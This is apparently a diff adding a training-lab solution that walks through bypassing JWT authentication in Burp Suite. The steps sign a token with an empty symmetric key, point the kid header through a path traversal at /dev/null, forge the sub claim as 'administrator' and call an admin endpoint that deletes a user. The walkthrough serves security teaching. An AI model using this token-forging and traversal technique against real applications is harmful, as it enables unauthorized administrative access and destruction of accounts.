@@ -1,0 +1,33 @@
+Solution:
+
+1. Install the JWT Editor extension from the Burp BApp Store.
+2. Log in using:
+   wiener:peter
+3. In Burp → Proxy → HTTP history, find the:
+   GET /my-account
+   request.
+4. Send the request to Burp Repeater.
+5. Change the path to:
+   GET /admin
+6. Go to the JWT Editor Keys tab.
+7. Click New Symmetric Key.
+8. Click Generate.
+9. Replace the value of the k property with an empty string:
+   "k": ""
+10. Click OK to save the key.
+11. Return to the GET /admin request in Burp Repeater.
+12. Open the JSON Web Token tab.
+13. Change the kid value in the JWT header to:
+../../../../../../../dev/null
+14. Change the sub claim to:
+"sub": "administrator"
+15. Click Sign.
+16. Select the symmetric key you generated.
+17. Make sure Don't modify header is selected, then click OK.
+18. Send the request:
+GET /admin
+19. Find the delete endpoint in the response:
+/admin/delete?username=carlos
+20. Send a request to:
+GET /admin/delete?username=carlos
+21. The lab is solved.
